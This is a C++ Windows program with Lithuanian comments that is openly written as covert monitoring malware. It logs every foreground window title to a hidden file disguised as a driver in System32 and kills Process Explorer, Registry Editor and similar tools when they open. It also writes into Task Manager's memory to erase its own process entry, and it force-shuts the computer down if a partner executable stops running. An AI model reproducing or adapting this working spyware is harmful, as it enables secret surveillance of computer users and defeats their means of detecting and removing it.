#include <iostream>
#include <fstream>
#include <windows.h>
#include <stdio.h>
#include <dos.h>
#include <String>
#include <cstring>
#include <time.h>
#include <sstream>
#include <windows.h>
#include <tlhelp32.h>
#include <algorithm>
#include <tchar.h>
#include <commctrl.h>
using namespace std;

//----kintamuju skydas---------------


//uzdraustos programos
#define MAX 4 //uzdraustu programu kiekis
string uzdrausta[]={"System Configuration","Process Explorer", "Registry Editor", "Process Viewer"};

//-----------Tapatybes nustatymai------------------
/*
LPCSTR titleOTHER="Burner";    //kitos programos title
LPCSTR titleMINE="Mifflin"; //mano programos title
char temp[]="mfpnp.exe";   //slepiamas exe failas is TaskManager
char kitas[]="PrintBrmSpool.exe";   //slepiamas exe failas is TaskManager
string vieta="C:/Windows/System32/twextrd.dll";  //-------Slapta saugojimo vieta--------
*/


LPCSTR titleOTHER="Mifflin";    //kitos programos title
LPCSTR titleMINE="Burner"; //mano programos title
char temp[]="PrintBrmSpool.exe";   //slepiamas exe failas is TaskManager
char kitas[]="mfpnp.exe";   //slepiamas exe failas is TaskManager
string vieta="C:/Windows/System32/drivers/Rt64win7.sys";  //-------Slapta saugojimo vieta--------

//--------------Globalus kintamieji------------------------
double TrintiTaskM=1;   //kas kiek laiko trinti Task Manager irasus
int ExitUzklausaTask=10000; //uz kiek laiko baigti kartotoi task uzklausa
int SearchTaskMgr=100; //kas kiek laiko ieskoti TaskManager Proceso
double laukti=1000;          //-------kas kiek laiko vykdyti atnaujinima Aktyvaus Lango-----------
const char* shut="shutdown -s -f -t 00";  //ka daryti jei staiga dingo kitas exe failas
int KitasExe=2000;  //kas kiek laiko tikrinti ar yra kitas exe failas
double Synchron=1000;  //kiek laukti kol isijungs kitas exe
int KantrybesRiba=60;  //vienetai(ciklo), kiek sekundziu laukti kol ivyks dvieju exe synchronizacija(sekundes yra pagal Synchron) sekundes=KantrybesRiba/Synchron
bool NeSleptiLanga=false;

//-------------Funkcijos---------------------
void PliusNulis(string&);
void Naikinti(string);
BOOL CALLBACK NaikintiIrasaTaskMgr(HWND,LPARAM);
bool ArVeikiaKitasExe();
void NaikTikrinti(string);


//------------Gijos------------------------
DWORD WINAPI ShutDown( void* );

DWORD WINAPI HackTaskManager( void* );

//-----------Objektai-----------------------------
class Duomenys
{
private:
	string Laikas;
	string Data;
	string Tekstas;
public:
	Duomenys(){
	this->Laikas="0";
	this->Tekstas="0";
	this->Data="0";
	
	
	}

	Duomenys(string a, string b, string c){
	this->Laikas=a;
	this->Tekstas=b;
	this->Data=c;
	}
	bool Atnaujinti(string a, string b)
	{
		if(Tekstas!=b)
		{
		Tekstas=b;
		Laikas=a;
		return true;
		}
		else
		{
		return false;
		
		}
	}
	string GetLaikas()
	{
	string eilute=Laikas;
	return eilute;
	}
	string GetTekstas()
	{
	string eilute=Tekstas;
	return eilute;
	}
	string GetData()
	{
	string eilute=Data;
	return eilute;
	}
};

class DataLaikas
{
private:
SYSTEMTIME st;
string datos, laikas;
string metai, menesis, diena, valanda, minutes, sekundes;
bool sek;

void Atnaujinti()
{
stringstream metaiSS, menesisSS, dienaSS, valandaSS, minutesSS, sekundesSS;

GetLocalTime(&st);
//------char to StringStream


metaiSS << st.wYear;
menesisSS << st.wMonth;
dienaSS << st.wDay;
valandaSS << st.wHour;
minutesSS << st.wMinute;
sekundesSS << st.wSecond;

//-----StringStream to String----
metai=metaiSS.str();
menesis=menesisSS.str();
diena=dienaSS.str();
valanda=valandaSS.str();
minutes=minutesSS.str();
sekundes=sekundesSS.str();

PliusNulis(metai);
PliusNulis(menesis);
PliusNulis(diena);
PliusNulis(valanda);
PliusNulis(minutes);
PliusNulis(sekundes);

}

public:
	DataLaikas(bool sek){
		this->sek=sek;
	Atnaujinti();
datos=metai+"/"+menesis+"/"+diena;
if(sek){
	laikas=valanda+":"+minutes+":"+sekundes;}
else{
laikas=valanda+":"+minutes;//+":"+sekundes;
}
	}
	string GetLaikas()
	{
	Atnaujinti();
if(sek){
	laikas=valanda+":"+minutes+":"+sekundes;}
else{
laikas=valanda+":"+minutes;//+":"+sekundes;
}
	
return laikas;
	}
	string GetData(){
	Atnaujinti();
datos=metai+"."+menesis+"."+diena;
return datos;
	}


};

class Langas
{
private:
char AntrasteC[512];
string AntrasteS;
HWND ActiveWin;
int ilgis;
void Atnaujinti(){
ActiveWin = GetForegroundWindow(); //Gets a handle to the window..
GetWindowTextA(ActiveWin, AntrasteC, ilgis); //Will get the window title for u..


}
public:
	Langas(int ilgis)
	{
		this->ilgis=ilgis;
Atnaujinti();
	}
	string GetLangas()
	{
	Atnaujinti();
	stringstream ss;
	ss << AntrasteC;
	AntrasteS=ss.str();
	//ss >> AntrasteS;
	return AntrasteS;
	
	
	
	}





};

class Rasymas{
protected:
	fstream failas;
public:
	Rasymas(string vieta)
	{

failas.open(vieta, ios::app);
	}

	virtual void Irasyti(string irasas){
	failas << irasas <<endl;
	}

void Uzdaryti()
{
failas.close();


}

};

class RasymasStrukt: public Rasymas{
private:
	Duomenys duom;
	string SenasLaikas;
public:
	RasymasStrukt(string vieta, Duomenys duom):Rasymas(vieta){
		this->duom=duom;
		SenasLaikas="";
	}
	void Irasyti(Duomenys duom)
	{
		if(SenasLaikas!=duom.GetLaikas())
		{
			string TimeStamp="-----"+duom.GetLaikas()+"-----";
			Rasymas::Irasyti("");
			Rasymas::Irasyti(TimeStamp);
			SenasLaikas=duom.GetLaikas();
		}
		string strukt=duom.GetTekstas();
	Rasymas::Irasyti(strukt);
	
	
	
	
	}
	void Uzdaryti()
	{
		Rasymas::failas.close();
	
	}



};




//------------Main Thread---------------------
int WINAPI WinMain(HINSTANCE inst,HINSTANCE prev,LPSTR cmd,int show){
//int main(){
//==============================================

//Sukuriama Gija skirta SHUTDOWN funkcijai
HANDLE h1 = CreateThread( NULL, 0, ShutDown, 0, 0L, NULL );
HANDLE h2 = CreateThread( NULL, 0, HackTaskManager, 0, 0L, NULL );
//================================================
	HWND window=GetConsoleWindow();
	//ShowWindow(window, NeSleptiLanga);
	SetConsoleTitle( titleMINE );
//----Init kintamieji------------
bool faktas=true;
bool atnaujinta=false;
//----Svarbiausi kintamieji-------------





//----Init Objektai---------------
DataLaikas laikas(false); //true kad ieitu ir sekundes
Langas langas(256);
Duomenys data(laikas.GetLaikas(), "q9wdcua-sudc09as-d8cuas7dyc070qehci", laikas.GetData());
//Duomenys data(laikas.GetLaikas(), langas.GetLangas(), laikas.GetData()); //isjungtas, kad nesikartotu cikle
Rasymas save3(vieta);
RasymasStrukt save2(vieta, data);

//-----End of Init-------
save3.Irasyti("");
save3.Irasyti("==========="+laikas.GetData()+"====["+titleMINE+"]============");
save3.Irasyti("");
save3.Uzdaryti();

do
{

	atnaujinta=data.Atnaujinti(laikas.GetLaikas(), langas.GetLangas());
	
	if(atnaujinta){
	save2.Irasyti(data);
	//-------Nenorimu Programu Naikinimas-----------
	NaikTikrinti(langas.GetLangas());

	}
	Sleep(laukti);





}
while(faktas);




system("pause");
return 0;
}

//-------------Funkcijos----------------------------
void PliusNulis(string &irasas)
{
int skaicius=stoi(irasas);
if(skaicius<10)
	irasas="0"+irasas;
}

void Naikinti(string pav)
{
wstring windowName;
	windowName.assign(pav.begin(), pav.end());


	HWND windowHandle = FindWindowW(NULL, windowName.c_str());
	DWORD* processID = new DWORD;
	GetWindowThreadProcessId(windowHandle, processID);

HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, *processID );
BOOL nReturnVal = TerminateProcess( hProcess,0);
CloseHandle (hProcess);
	
	//system("taskkill /F /T /IM regedit.exe");




}

void NaikTikrinti(string pav)
{


for(int i=0; i<MAX; i++){
	string temp;
	size_t kiek=uzdrausta[i].size();
	temp.assign(pav, 0, kiek);
	int comp=uzdrausta[i].compare(temp);
	if(comp==0){
		Naikinti(pav);
		Rasymas save1(vieta);
		save1.Irasyti("");
		save1.Irasyti("------Nujungta programa pavadinimu("+pav+")-------CLOSED_WINDOW------");
		save1.Irasyti("");
		save1.Uzdaryti();

	}



}

}

BOOL CALLBACK NaikintiIrasaTaskMgr(HWND hWnd,LPARAM lParam){
	
     char name[256];
     GetWindowText(hWnd,name,256);	
     
     char ClassName[256];	
     GetClassName(hWnd,ClassName,256); 
      
     LVFINDINFO   info;   
     memset(&info,0,sizeof(LVFINDINFO));  
     DWORD   nIndex;   
     int Id;   
         info.flags   = LVFI_STRING |LVFI_PARTIAL;
        
	 if((strcmp(ClassName,"SysListView32")==0)&&(strcmp(name,"Processes")==0))	
     {		
         GetWindowThreadProcessId(hWnd,(LPDWORD)&nIndex);		
         HANDLE   Process=OpenProcess(PROCESS_ALL_ACCESS,FALSE, nIndex);		
         if(0<Process)		
         {				
              void   *Address=VirtualAllocEx(Process,NULL,sizeof(info),MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);			
              void   *Addressx=VirtualAllocEx(Process,NULL,sizeof(temp),MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);			
              WriteProcessMemory(Process,Addressx,&temp,sizeof(temp),0);				
              info.psz=(char*)Addressx;			
              WriteProcessMemory(Process,Address,&info,sizeof(info),0);				
              unsigned long p=0;
			  while(1){
				    Sleep(TrintiTaskM);
					p++;
			  Id=SendMessage(hWnd,LVM_FINDITEM,-1,(LPARAM) Address);	
			  
              if(Id!=-1)	        
				  		SendMessage(hWnd,LVM_DELETEITEM,Id,0);
			  if(p>ExitUzklausaTask)
				  break;
		 }
         }			
     }	
     if(name==NULL)		
          return FALSE;	
     return TRUE;
	
	}

bool ArVeikiaKitasExe()
{
	bool situac=false;
PROCESSENTRY32 ppe = {0};
	ppe.dwSize = sizeof (PROCESSENTRY32);

	HANDLE hSnapShot = CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS, 0);
	if (Process32First (hSnapShot, &ppe))
	{
		do
		{
			if (!stricmp (kitas, ppe.szExeFile) && (ppe.th32ProcessID != GetCurrentProcessId ()))
			{
				situac=true;
			}
		}while (Process32Next (hSnapShot, &ppe));
	}

	CloseHandle (hSnapShot);

	return situac;
}


//----------Gijos---------------
DWORD WINAPI ShutDown( void* pContext ){
	bool pasake=false;
	int kantrybe=0;
	//-----Sinchronizacija--------
	for(;;){
		Sleep(Synchron);
	//HWND hWnd1 = ::FindWindow(NULL,titleOTHER);
		bool ar=false;
		ar=ArVeikiaKitasExe();
	if(ar)
		break;
	kantrybe++;


	if(kantrybe>KantrybesRiba)
	{
	kantrybe=0;

	Rasymas save(vieta);
	save.Irasyti("");
	save.Irasyti("---------------Nepavyko dvieju exe sinchronizacija-------FAILED_SYNC-----------------");
	save.Irasyti("");
	save.Uzdaryti();
	}

	}




    for(;;){
		
		//HWND hWnd = ::FindWindow(NULL,titleOTHER);
		bool ar2=false;
		ar2=ArVeikiaKitasExe(); //ar kita programa veikia
if(!ar2){

if(!pasake){
system(shut);
Rasymas save2(vieta);

save2.Irasyti("");
	save2.Irasyti("-------------Dingo stebimas exe failas pavadinimu("+(string)titleOTHER+")--Issijungiu kompa---EXE_GONE----");
	save2.Irasyti("");
	save2.Uzdaryti();
	pasake=true;
}
}


Sleep(KitasExe);
}
	return 0;
}

DWORD WINAPI HackTaskManager( void* pContext )
{
unsigned long i=0;
for(;;){
	Sleep(SearchTaskMgr);
	HWND hWnd = NULL;
	i++;
	if(i>100)
		i=0;

	
	hWnd = ::FindWindow(NULL,"Windows Task Manager");
	if(hWnd)
	{
	
           EnumChildWindows(hWnd,NaikintiIrasaTaskMgr,NULL);
         
    


	}
   
}
return 0;
}